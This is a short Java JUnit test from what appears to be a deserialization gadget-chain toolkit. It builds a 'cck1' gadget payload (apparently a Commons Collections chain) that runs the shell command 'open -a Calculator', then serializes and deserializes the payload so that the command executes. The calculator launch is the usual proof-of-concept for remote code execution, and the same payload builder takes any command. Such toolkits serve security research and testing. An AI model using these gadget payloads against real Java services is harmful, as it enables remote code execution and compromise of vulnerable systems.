package gadget;

import gadget.context.GContext;
import org.junit.Test;
import util.CommonUtil;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

public class CCK1Test {
    @Test
    public void testCalc() throws Exception {
        GContext context = new GContext();
        ObjectPayload op = context.getGadget("cck1");
        Object evil = op.getObjectPayload("open -a Calculator");
        byte[] data = CommonUtil.serialize(evil);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        ois.readObject();
    }
}
